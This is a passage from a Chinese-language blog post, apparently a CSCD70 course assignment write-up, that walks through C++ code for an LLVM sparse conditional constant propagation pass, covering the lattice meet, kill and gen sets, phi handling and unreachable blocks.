Value;</span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">ConstantStatus</span> Status = NAC;</span><br><span class="line">  Constant <span class="keyword">operator</span>&amp;(<span class="type">const</span> Constant&amp; Other) <span class="type">const</span> {</span><br><span class="line">    Constant result;</span><br><span class="line">    result.Status = std::<span class="built_in">min</span>(Status,Other.Status);</span><br><span class="line">    <span class="keyword">if</span>(result.Status==CONST)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(Status == CONST &amp;&amp; Other.Status==CONST)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(Value != Other.Value)</span><br><span class="line">        {</span><br><span class="line">          result.Status = NAC;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          result.Value = Value;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(Status == CONST)</span><br><span class="line">        result.Value = Value;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(Other.Status == CONST)</span><br><span class="line">        result.Value = Other.Value;        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Constant <span class="title">top</span><span class="params">()</span> </span>{<span class="keyword">return</span> {.Status = UNDEF};}</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="type">const</span> </span>{<span class="keyword">return</span> Status==CONST;}</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="Kill集"><a href="#Kill集" class="headerlink" title="Kill集"></a>Kill集</h5><p>还是之前的思路,根据本次Value被其他指令使用来判断本次指令是一次defination,设置对应的Variable状态为NAC.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果该指令是一次定义,设置该指令代表的变量为NAC</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; V : DomainVector)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(<span class="type">const</span> Instruction* InofV = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(V.Var))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : InofV-&gt;<span class="built_in">operands</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(operand.<span class="built_in">get</span>() == &amp;Inst)</span><br><span class="line">        {</span><br><span class="line">          <span class="type">int64_t</span> id;</span><br><span class="line">          <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">          {</span><br><span class="line">            NewODV.<span class="built_in">at</span>(id).Status = dfa::NAC;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h5 id="Gen集"><a href="#Gen集" class="headerlink" title="Gen集"></a>Gen集</h5><p>照着这幅图实现就行.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(IDV[id2].Status==dfa::NAC)</span><br><span class="line">      {</span><br><span class="line">        NewODV[id1].Status = dfa::NAC;</span><br><span class="line">        ifnac = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(IDV[id2].Status == dfa::UNDEF)</span><br><span class="line">      {</span><br><span class="line">        NewODV[id1].Status = dfa::UNDEF;</span><br><span class="line">        ifundef = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }    </span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(!ifnac)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(!ifundef)</span><br><span class="line">  {</span><br><span class="line">    NewODV[id1].Status = dfa::CONST;</span><br><span class="line">    NewODV[id1].Value = <span class="built_in">getConstantValue</span>(Inst,IDV);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对于phi指令需要特化,原因有二:<br>    1. phi的结果为CONST,需要其操作数全为CONST,且值相同.<br>    2. phi的某个操作数若来自NeverReachBB时,不做考虑.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ifphi)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">//特化phi,与其他的操作符有不同的规则</span></span><br><span class="line">  dfa::Constant r = {.Status=dfa::UNDEF};</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="type">const</span> PHINode* phiNode = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;Inst))</span><br><span class="line">    {</span><br><span class="line">      <span class="comment">//如果phi的某个值来自NeverReachBB,不与其进行Meet操作.</span></span><br><span class="line">      <span class="keyword">if</span>((NeverReachBBs.<span class="built_in">find</span>(phiNode-&gt;<span class="built_in">getIncomingBlock</span>(operand)))!=NeverReachBBs.<span class="built_in">end</span>())</span><br><span class="line">      {</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">          {</span><br><span class="line">            r = r &amp; (IDV.<span class="built_in">at</span>(id2));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        {</span><br><span class="line">          r = r &amp; dfa::<span class="built_in">Constant</span>({.Value=<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>(),.Status=dfa::CONST});</span><br><span class="line">        }</span><br><span class="line">      }    </span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  NewODV.<span class="built_in">at</span>(id1) = r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Never-Reach-Basic-Block"><a href="#Never-Reach-Basic-Block" class="headerlink" title="Never Reach Basic Block"></a>Never Reach Basic Block</h5><p>对于跳转指令,判断其条件是否恒真或恒假来更新NeverReachBB.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据跳转条件是否为常量来</span></span><br><span class="line"><span class="comment">//修改要操作的基本块集合</span></span><br><span class="line"><span class="keyword">if</span>(Inst.<span class="built_in">getOpcode</span>()==Instruction::Br) </span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">getNumOperands</span>()==<span class="number">3</span>) <span class="comment">//只处理条件跳转</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">auto</span> condition = Inst.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">bool</span> ifconst = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int64_t</span> truth;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(condition))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(condition))!= <span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(IDV.<span class="built_in">at</span>(id).Status == dfa::CONST)</span><br><span class="line">        {</span><br><span class="line">          ifconst = <span class="literal">true</span>;</span><br><span class="line">          truth = IDV.<span class="built_in">at</span>(id).Value;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      ifconst = <span class="literal">true</span>;</span><br><span class="line">      truth = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(condition)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">    }    </span><br><span class="line">    <span class="keyword">if</span>(ifconst)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(truth)</span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">      NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h5 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h5><p>唉,本来想写得优雅一点的,改着改着就成这样了…<br>ps: calc只处理了测试用例中有的指令.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SCCP::InitializeDomainFromInstruction</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : In.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(operand)||<span class="built_in">isa</span>&lt;Argument&gt;(operand))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>((DomainIdMap.<span class="built_in">emplace</span>(std::<span class="built_in">pair</span>(operand.<span class="built_in">get</span>(),DomainIdMap.<span class="built_in">size</span>()))).second)</span><br><span class="line">      {</span><br><span class="line">        DomainVector.<span class="built_in">push_back</span>(operand.<span class="built_in">get</span>());</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(<span class="type">int64_t</span>&amp; result,<span class="type">const</span> std::vector&lt;<span class="type">int64_t</span>&gt;&amp; val,<span class="type">const</span> Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">  {</span><br><span class="line">  <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">    result += val.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">case</span> Instruction::ICmp:</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">auto</span> IcmpIn = <span class="built_in">dyn_cast</span>&lt;ICmpInst&gt;(&amp;In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">switch</span> (IcmpIn-&gt;<span class="built_in">getPredicate</span>())</span><br><span class="line">      {</span><br><span class="line">      <span class="keyword">case</span> ICmpInst::ICMP_SLT:</span><br><span class="line">        result = (val[<span class="number">0</span>] &lt; val[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">SCCP::getConstantValue</span><span class="params">(<span class="type">const</span> Instruction&amp; In,<span class="type">const</span> DomainVal_t &amp;IDV)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int64_t</span> result;</span><br><span class="line">  std::vector&lt;<span class="type">int64_t</span>&gt; val_list;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : In.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        val_list.<span class="built_in">push_back</span>(IDV.<span class="built_in">at</span>(id).Value);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      val_list.<span class="built_in">push_back</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">calc</span>(result,val_list,In);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SCCP::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line">  <span class="type">static</span> std::set&lt;BasicBlock*&gt;NeverReachBBs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//对NeverReachBB不做处理</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; NeverReachBB : NeverReachBBs)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(Inst.<span class="built_in">getParent</span>()==NeverReachBB)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">//根据跳转条件是否为常量来</span></span><br><span class="line">  <span class="comment">//修改要操作的基本块集合</span></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">getOpcode</span>()==Instruction::Br) </span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(Inst.<span class="built_in">getNumOperands</span>()==<span class="number">3</span>) <span class="comment">//只处理条件跳转</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">auto</span> condition = Inst.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="type">bool</span> ifconst = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">int64_t</span> truth;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(condition))</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int64_t</span> id;</span><br><span class="line">        <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(condition))!= <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span>(IDV.<span class="built_in">at</span>(id).Status == dfa::CONST)</span><br><span class="line">          {</span><br><span class="line">            ifconst = <span class="literal">true</span>;</span><br><span class="line">            truth = IDV.<span class="built_in">at</span>(id).Value;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        ifconst = <span class="literal">true</span>;</span><br><span class="line">        truth = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(condition)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">      }    </span><br><span class="line">      <span class="keyword">if</span>(ifconst)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(truth)</span><br><span class="line">        {</span><br><span class="line">          NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">        NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="comment">//如果该指令是一次定义,设置该指令代表的变量为NAC</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; V : DomainVector)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(<span class="type">const</span> Instruction* InofV = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(V.Var))</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : InofV-&gt;<span class="built_in">operands</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span>(operand.<span class="built_in">get</span>() == &amp;Inst)</span><br><span class="line">            {</span><br><span class="line">              <span class="type">int64_t</span> id;</span><br><span class="line">              <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">              {</span><br><span class="line">                NewODV.<span class="built_in">at</span>(id).Status = dfa::NAC;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="type">int64_t</span> id1,id2;</span><br><span class="line">      <span class="type">bool</span> ifnac = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">bool</span> ifundef = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">bool</span> ifphi = (Inst.<span class="built_in">getOpcode</span>() == Instruction::PHI);</span><br><span class="line">      <span class="keyword">if</span>((id1 = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!= <span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(ifphi)</span><br><span class="line">        {</span><br><span class="line">          <span class="comment">//特化phi,与其他的操作符有不同的规则</span></span><br><span class="line">          dfa::Constant r = {.Status=dfa::UNDEF};</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="type">const</span> PHINode* phiNode = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;Inst))</span><br><span class="line">            {</span><br><span class="line">              <span class="comment">//如果phi的某个值来自NeverReachBB,不与其进行Meet操作.</span></span><br><span class="line">              <span class="keyword">if</span>((NeverReachBBs.<span class="built_in">find</span>(phiNode-&gt;<span class="built_in">getIncomingBlock</span>(operand)))!=NeverReachBBs.<span class="built_in">end</span>())</span><br><span 